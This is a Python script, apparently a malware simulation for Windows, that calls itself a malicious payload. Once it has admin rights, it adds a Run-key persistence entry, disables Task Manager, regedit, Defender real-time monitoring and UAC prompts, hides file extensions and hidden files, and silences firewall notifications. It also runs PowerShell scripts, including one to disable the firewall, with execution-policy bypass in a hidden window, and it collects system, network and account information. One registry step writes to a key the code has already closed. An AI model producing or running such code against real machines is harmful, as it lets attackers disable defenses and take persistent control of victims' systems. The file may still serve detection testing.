import os
import subprocess
import winreg as reg
import ctypes

def is_admin():
    """현재 스크립트가 관리자 권한으로 실행되었는지 확인"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def registry_manipulation():
    """10가지 레지스트리 생성 및 변조"""
    if not is_admin():
        print("[-] 관리자 권한이 없어 레지스트리 조작을 건너뜁니다.")
        return

    print("[+] 레지스트리 변조를 시작합니다...")
    try:
        # --- 기능적 조작 (기반 확보) ---

        # 1. 부팅 시 자동 실행 등록 (Persistence)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        import sys
        reg.SetValueEx(key, "MaliciousApp", 0, reg.REG_SZ, sys.executable)
        reg.CloseKey(key)
        print("[+] 1/10: 시작프로그램 등록 완료.")

        # 2. 작업 관리자 비활성화 (Analysis Evasion)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
        print("[+] 2/10: 작업 관리자 비활성화 완료.")

        # 3. 레지스트리 편집기 비활성화 (Analysis Evasion)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
        reg.SetValueEx(key, "DisableRegistryTools", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
        print("[+] 3/10: 레지스트리 편집기 비활성화 완료.")

        # --- 환경적 조작 (방어 회피 및 혼란 유발) ---

        # 4. 파일 확장자 숨기기 (User Deception)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "HideFileExt", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
        print("[+] 4/10: 파일 확장자 숨김 처리 완료.")

        # 5. 숨김 파일 및 폴더 안 보이게 강제 (Stealth)
        reg.SetValueEx(key, "Hidden", 0, reg.REG_DWORD, 2)
        reg.CloseKey(key)
        print("[+] 5/10: 숨김 파일/폴더 표시 기능 비활성화 완료.")
        
        # 6. Windows Defender 실시간 감시 무력화 (Defense Evasion)
        key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, key_path)
        reg.SetValueEx(key, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
        print("[+] 6/10: Windows Defender 실시간 감시 비활성화 완료.")

        # 7. 바탕화면 변경 (Psychological Effect)
        key_path = r"Control Panel\Desktop"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        # 윈도우 기본 비트맵 이미지 중 하나로 변경하여 시각적 감염 증거 제시
        reg.SetValueEx(key, "Wallpaper", 0, reg.REG_SZ, r"C:\Windows\System32\setup.bmp")
        reg.CloseKey(key)
        print("[+] 7/10: 바탕화면 이미지 강제 변경 완료.")

        # 8. 마우스 좌우 버튼 바꾸기 (User Disruption)
        key_path = r"Control Panel\Mouse"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "SwapMouseButtons", 0, reg.REG_SZ, "1")
        reg.CloseKey(key)
        print("[+] 8/10: 마우스 좌우 버튼 기능 전환 완료.")
        
        # 9. UAC(사용자 계정 컨트롤) 프롬프트 비활성화 (Defense Evasion)
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, reg.REG_DWORD, 0)
        reg.CloseKey(key)
        print("[+] 9/10: UAC 동의 프롬프트 비활성화 완료.")
        
        # 10. 방화벽 알림 기능 비활성화 (Defense Evasion)
        key_path = r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile"
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, key_path)
        reg.SetValueEx(key, "DisableNotifications", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
        print("[+] 10/10: 방화벽 알림 비활성화 완료.")

    except Exception as e:
        print(f"[-] 레지스트리 조작 중 오류 발생: {e}")

def powershell_execution():
    """5가지 파워쉘 스크립트 실행"""
    print("[+] PowerShell 스크립트 실행을 시작합니다...")
    # exe 파일과 같은 경로에 .ps1 파일들이 있다고 가정
    script_dir = os.path.dirname(os.path.abspath(__file__))
    ps_scripts = [
        "create-file.ps1", "list-apps.ps1", "list-services.ps1",
        "get-network.ps1", "disable-firewall.ps1"
    ]
    for script in ps_scripts:
        script_path = os.path.join(script_dir, script)
        if os.path.exists(script_path):
            try:
                # -ExecutionPolicy Bypass : 실행 정책 우회
                # -WindowStyle Hidden : 창 숨김
                subprocess.run(
                    ["powershell.exe", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", script_path],
                    check=True
                )
                print(f"[+] '{script}' 실행 성공.")
            except Exception as e:
                print(f"[-] '{script}' 실행 오류: {e}")
        else:
            print(f"[-] 스크립트 파일을 찾을 수 없음: {script_path}")


def information_gathering():
    """cmd.exe를 사용하여 5가지 정보 수집 후 txt로 저장"""
    print("[+] 시스템 정보 수집을 시작합니다...")
    output_file = "system_info_report.txt"
    commands = {
        "===== System Info =====": "systeminfo",
        "===== IP Config =====": "ipconfig /all",
        "===== Network Connections =====": "netstat -an",
        "===== Running Tasks =====": "tasklist /v",
        "===== User Accounts =====": "net user"
    }
    with open(output_file, "w", encoding='utf-8', errors='ignore') as f:
        for title, cmd in commands.items():
            f.write(f"\n{title}\n\n")
            # shell=True는 보안에 취약할 수 있지만, 여기서는 시뮬레이션 목적상 사용
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='cp949')
            f.write(result.stdout + result.stderr)
    print(f"[+] 정보 수집 완료: {output_file}")


if __name__ == "__main__":
    if is_admin():
        print("### 악성 페이로드 실행 (관리자 모드) ###")
        registry_manipulation()
        powershell_execution()
        information_gathering()
        print("\n### 모든 작업 완료. 10초 후 자동 종료됩니다. ###")
        import time
        time.sleep(10)
    else:
        # 이 부분은 사용자가 직접 더블클릭 했을 때를 위한 안내
        print("이 프로그램은 관리자 권한이 필요합니다.")
        input("Press Enter to exit...")